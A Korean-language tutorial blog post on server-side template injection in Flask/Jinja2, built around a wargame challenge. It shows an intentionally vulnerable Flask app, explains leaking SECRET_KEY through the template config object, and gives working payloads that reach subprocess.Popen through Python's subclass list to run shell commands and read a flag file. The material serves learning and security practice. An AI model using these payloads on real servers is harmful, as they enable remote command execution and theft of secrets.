---
title: SSTI (Server Side Template Injection)
date: 2022-05-21 19:07 +0900
categories: [Hacking, Web]
tags: [SSTI, Server Side Template Injection, jinja2, template engine, template system, flask, flask global object, config, session, request, g]
---

## Template Engine?
<hr style="border-top: 1px solid;"><br>

템플릿 양식과 특정 데이터 모델에 따른 입력 자료를 결합하여 원하는 결과 문서를 출력하는 소프트웨어이다.

<br>

![image](https://user-images.githubusercontent.com/52172169/169673838-9cd85025-0c29-47cc-9e87-d963d7765ab9.png)

<br>

그중 웹 템플릿엔진(Web Template Engine)이란 웹문서가 출력되는 엔진이다.

웹 템플릿 엔진은 view code(html)와 data logic code(db connection)를 분리해주는 기능을 한다.

<br>

Template Engine에는 용도에 따라 구분이 되는데, 그 중 Server-Side Template Engine이 있다.

Server-Side Template Engine이란, 서버에서 DB 혹은 API에서 가져온 데이터를, 미리 정의된 Template에 넣어 html을 그려서 클라이언트에 전달해주는 역할을 한다.

즉, HTML 코드에서 고정적으로 사용되는 부분은 템플릿으로 만들어두고(템플릿 양식), 동적으로 생성되는 부분만 템플릿 특정 장소에 끼워넣는 방식으로 동작할 수 있도록 해준다.

<br>

따라서 ```1) 클라이언트에서 데이터를 요청하면```, ```2) 서버에서 DB나 API로부터 필요한 데이터를 받아와서 미리 정의된 템플릿에 데이터를 넣고```, ```3) 서버에서 HTML(데이터가 반영된 템플릿)을 생성하여```, ```4) 생성한 HTML 파일을 클라이언트에게로 응답한다.```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## SSTI
<hr style="border-top: 1px solid;"><br>

```SSTI (Server Side Template Injection)``` 이란, 서버에서 사용하는 특정 템플릿이 있을 때, 그 템플릿 문법를 이용하여 서버에 인젝션 공격을 하는 공격 기법이다.

Server Side Template system에는 Jinja2, Django 등이 있고 자세한 건 
: <a href="https://en.wikipedia.org/wiki/Web_template_system#Server-side_systems" target="_blank">en.wikipedia.org/wiki/Web_template_system#Server-side_systems</a>

<br>

Dreamhack에서 ```simple-ssti``` 라는 문제가 있는데, 여기서 실습할 수 있다.
: <a href="https://dreamhack.io/wargame/challenges/39/" target="_blank">dreamhack.io/wargame/challenges/39/</a>

또는 간단한 코드를 짜서 테스트 해보면 된다.

<br>

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

app.secret_key = FLAG

@app.route('/')
def ssti():
	vuln=request.args.get('ssti')
	template='''
	<h1>SSTI TEST</h1>
	<h3>%s</h1>
	'''% (vuln)
	return render_template_string(template)

app.run(host='0.0.0.0', port=8000)
```

<br>

위 문제에서는 Flask(jinja2)를 사용하고 있다.

<br>

flask, jinja  ---> 기본적으로 알아야 함
: <a href="https://flask.palletsprojects.com/en/2.1.x/" target="_blank">flask.palletsprojects.com/en/2.1.x/</a>
: <a href="https://jinja.palletsprojects.com/en/3.0.x/" target="_blank">jinja.palletsprojects.com/en/3.0.x/</a>
: <a href="https://tedboy.github.io/jinja2/index.html" target="_blank">tedboy.github.io/jinja2/index.html</a>

<br>

![image](https://user-images.githubusercontent.com/52172169/169654971-b6bf8a9a-b22e-4b77-874c-33eda5cf5c9b.png)

<br>

jinja variable
: <a href="https://jinja.palletsprojects.com/en/3.0.x/templates/#variables" target="_blank">jinja.palletsprojects.com/en/3.0.x/templates/#variables</a>

<br>

Expression
: <a href="https://jinja.palletsprojects.com/en/3.1.x/templates/#expressions" target="_blank">jinja.palletsprojects.com/en/3.1.x/templates/#expressions</a>

<br>

사용되는 건 ```literals(문자열, 정수, 소수, 리스트, 튜플, 딕셔너리, true, false), python methods, jinja built-in filters, jinja built-in tests```이다.

<br>

jinja2, flask API
: <a href="https://flask.palletsprojects.com/en/2.1.x/api/" target="_blank">flask.palletsprojects.com/en/2.1.x/api/</a>
: <a href="https://jinja.palletsprojects.com/en/3.0.x/api/" target="_blank">jinja.palletsprojects.com/en/3.0.x/api/</a>

<br>

python built-in types, data model ---> 잘 알아둬야 함!!
: <a href="https://docs.python.org/ko/3/library/stdtypes.html" target="_blank">docs.python.org/ko/3/library/stdtypes.html</a>
: <a href="https://docs.python.org/ko/3/reference/datamodel.html" target="_blank">docs.python.org/ko/3/reference/datamodel.html</a>

<br>

python에서는 모든 것이 클래스이다?
: <a href="https://gist.github.com/shoark7/fb388e6494350442a2d649a154f69a3a" target="_blank">gist.github.com/shoark7/fb388e6494350442a2d649a154f69a3a</a>

<br>

**위의 내용들을 모두 알아두는 게 기본인 것 같다..!!**

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Flask 내 object를 이용한 공격
<hr style="border-top: 1px solid;"><br>

기본적으로 ```config```을 이용하는 방법이 있다.
: <a href="https://flask.palletsprojects.com/en/2.1.x/config/" target="_blank">flask.palletsprojects.com/en/2.1.x/config/</a>

<br>

```flask``` 클래스의 클래스 변수로 ```config```가 있는데, ```Config``` 클래스의 객체이다.

```config```의 키 값 중 ```SECRET_KEY```가 들어 있다.

**결론은, flask 클래스에서 ```self.config = Config(default_config)```가 된다. 여기서 ```default_config```에는 기본 configuration 값이 설정되어 있다.**

<br>

근데 코드를 보면 ```app.secret_key```가 아니라 ```app.config['SECRET_KEY']```로만 접근 가능한 것 아닌가? 하는 생각이 들 수 있는데, 2가지 이유로 가능하다.

<br>

+ ```Certain configuration values are also forwarded to the Flask object so you can read and write them from there: app.testing = True```
  + <a href="https://flask.palletsprojects.com/en/2.1.x/api/#flask.Flask" target="_blank">flask.palletsprojects.com/en/2.1.x/api/#flask.Flask</a>
  + <a href="https://github.com/pallets/flask/blob/ca8e6217fe450435e024bcff3082d2a37445f7e1/src/flask/app.py#L266" target="_blank">github.com/pallets/flask/blob/ca8e6217fe450435e024bcff3082d2a37445f7e1/src/flask/app.py#L266</a>
  + ```flask.Flask```에는 ```testing, secret_key``` 등이 있어서 바로 설정이 가능하다.

<br>

+ <a href="https://flask.palletsprojects.com/en/2.1.x/api/#flask.Flask.secret_key" target="_blank">flask.palletsprojects.com/en/2.1.x/api/#flask.Flask.secret_key</a>
  + ```flask.Flask.secret_key```에 ```This attribute can also be configured from the config with the SECRET_KEY configuration key.```라는 설명이 있다.

<br>

전역으로 사용 가능한 object 목록은 아래와 같다!!
: <a href="https://flask.palletsprojects.com/en/2.1.x/quickstart/#rendering-templates" target="_blank">lask.palletsprojects.com/en/2.1.x/quickstart/#rendering-templates</a>
: ```Inside templates you also have access to the [config, request, session and g] objects as well as the url_for() and get_flashed_messages() functions.```
: <a href="https://github.com/pallets/flask/blob/ca8e6217fe450435e024bcff3082d2a37445f7e1/src/flask/app.py#L729" target="_blank">github.com/pallets/flask/blob/ca8e6217fe450435e024bcff3082d2a37445f7e1/src/flask/app.py#L729</a>

<br>

+ config
  + <a href="https://flask.palletsprojects.com/en/2.1.x/api/#configuration" target="_blank">flask.palletsprojects.com/en/2.1.x/api/#configuration</a>
  + <a href="https://flask.palletsprojects.com/en/2.1.x/config/" target="_blank">flask.palletsprojects.com/en/2.1.x/config/</a>

+ request
  + <a href="https://flask.palletsprojects.com/en/2.1.x/api/#flask.Request" target="_blank">flask.palletsprojects.com/en/2.1.x/api/#flask.Request</a>

+ session
  + <a href="https://flask.palletsprojects.com/en/2.1.x/api/#flask.session" target="_blank">flask.palletsprojects.com/en/2.1.x/api/#flask.session</a>

+ g
  + <a href="https://flask.palletsprojects.com/en/2.1.x/api/#flask.g" target="_blank">flask.palletsprojects.com/en/2.1.x/api/#flask.g</a>

<br>

config는 dictionary 처럼 동작하지만, 추가적인 메소드도 지원한다.
: <a href="https://flask.palletsprojects.com/en/2.1.x/api/#flask.Config" target="_blank">flask.palletsprojects.com/en/2.1.x/api/#flask.Config</a>
: ```ex) from_object(), from_file()```
: ```ex) app.config.from_object('os')```

<br><br>

config를 출력할 수 있다면 아래와 같이 출력된다.

![image](https://user-images.githubusercontent.com/52172169/169680115-07009129-2ed8-42b0-9ebf-c0724aec4ec2.png)

<br>

```config['SECRET_KEY']```와 동일한 표현으로 ```config.SECRET_KEY``` 또는 ```config.__getitem__('SECRET_KEY')```가 있다.
: ```getattr(config,'SECRET_KEY'), config|attr("SECRET_KEY")```는 작동하지 않았음..


<br><br>
<hr style="border: 2px solid;">
<br><br>

## Python 특수 어트리뷰트를 이용한 공격
<hr style="border-top: 1px solid;"><br>

config를 이용한 공격은 거의 막힌다고 보면 된다. 

따라서 파이썬의 내장된 것을 이용한 공격을 익혀둬야 한다. 

<br>

python built-in, special attribute
: <a href="https://ind2x.github.io/posts/python_builtins_and_special_attributes/#special-attribute" target="_blank">ind2x.github.io/posts/python_builtins_and_special_attributes/#special-attribute</a>

<br>

파이썬에서는 모든 것이 클래스이며 최상위 클래스는 object 클래스이다.

object 클래스의 서브클래스를 확인해보면 파이썬의 클래스 객체들이 들어 있는 걸 확인할 수 있다.
: ```object.__subclasses__()```

<br>

```''.__class__```를 하면 ```<class 'str'>```이 출력된다.

```''.__class__.mro()```를 하면 ```[<class 'str'>, <class 'object'>]```가 출력된다.

```''.__class__.mro()[1].__subclasses__()``` 또는 ```''.__class__.__base__.__subclasses__()```를 하면 object 클래스의 서브클래스들이 나온다. 
: 예를 들면, ```<class 'int'>```

이제 여기서 ```<class 'subprocess.Popen'>``` 클래스를 사용할 것이다.

<br>

<class 'subprocess.Popen'>
: <a href="https://docs.python.org/ko/3/library/subprocess.html#popen-constructor" target="_blank">docs.python.org/ko/3/library/subprocess.html#popen-constructor</a>
: <a href="http://theyoonicon.com/python-popen-클래스/" target="_blank">theyoonicon.com/python-popen-클래스/</a>
: ```Execute a child program in a new process. On POSIX, the class uses os.execvpe()-like behavior to execute the child program```
: ```POSIX에서 shell=True일 때, 셸의 기본값은 /bin/sh입니다.```


<br>

```''.__class__.__base__.__subclasses__()[282:]```, 282번째 인덱스에 ```subprocess.Popen``` 클래스가 있다.

그 다음은 Popen 사용법대로 사용하면 된다.

Popen 클래스 메소드 중 ```communicate```가 있는데 프로세스와 상호작용 하는 메소드다.
: <a href="https://docs.python.org/ko/3/library/subprocess.html#subprocess.Popen.communicate" target="_blank">docs.python.org/ko/3/library/subprocess.html#subprocess.Popen.communicate</a>
: 리턴 값으로 튜플 ```(stdout_data, stderr_data)``` 를 반환한다.

<br>

Popen 객체를 통해 communicate로 프로세스의 리턴 값을 보려면 stdin, stdout, stderr 값으로 subprocess.PIPE를 사용해야 한다.

PIPE 값은 소스코드를 보면 -1이다.
: <a href="https://github.com/python/cpython/blob/3.10/Lib/subprocess.py#L259" target="_blank">github.com/python/cpython/blob/3.10/Lib/subprocess.py#L259</a>

<br>

따라서 Popen 사용법은 다음과 같다.
: ```subprocess.Popen('ls',shell=True,stdout=-1).communicate()```

<br>

payload는 다음과 같다.

+ ```''.__class__.__base__.__subclasses__()[282]('ls', shell=True, stdout=-1).communicate()```
  + ```(b'flag.txt\nmain.py\npoetry.lock\npyproject.toml\nREADME.md\n', None)```

+ ```''.__class__.__base__.__subclasses__()[282]('cat ./flag.txt', shell=True, stdout=-1).communicate()```
  + ```(b'THIS_IS_FLAG', None)```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## 참고
<hr style="border-top: 1px solid;"><br>

template engine
: <a href="https://gmlwjd9405.github.io/2018/12/21/template-engine.html" target="_blank">gmlwjd9405.github.io/2018/12/21/template-engine.html</a>
: <a href="https://nesoy.github.io/articles/2017-03/web-template" target="_blank">nesoy.github.io/articles/2017-03/web-template</a>
: <a href="https://insight-bgh.tistory.com/252" target="_blank">insight-bgh.tistory.com/252</a>

<br>

builtins module
: <a href="https://dokhakdubini.tistory.com/471" target="_blank">dokhakdubini.tistory.com/471</a>

<br>

SSTI
: <a href="https://dokhakdubini.tistory.com/515" target="_blank">dokhakdubini.tistory.com/515</a>
: <a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/" target="_blank">onsecurity.io/blog/server-side-template-injection-with-jinja2/</a>
: <a href="https://core-research-team.github.io/2021-05-01/Server-Side-Template-Injection(SSTI)#3-ssti-필터링-우회-in-ctf---jinja2" target="_blank">core-research-team.github.io/2021-05-01/Server-Side-Template-Injection(SSTI)#3-ssti-필터링-우회-in-ctf---jinja2</a>
: <a href="https://me2nuk.com/SSTI-Vulnerability/" target="_blank">me2nuk.com/SSTI-Vulnerability/</a>
: <a href="https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/" target="_blank">kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/</a>

<br>

python jailbreak
: <a href="https://w01fgang.tistory.com/155" target="_blank">w01fgang.tistory.com/155</a>

<br><br>
<hr style="border: 2px solid;">
<br><br>
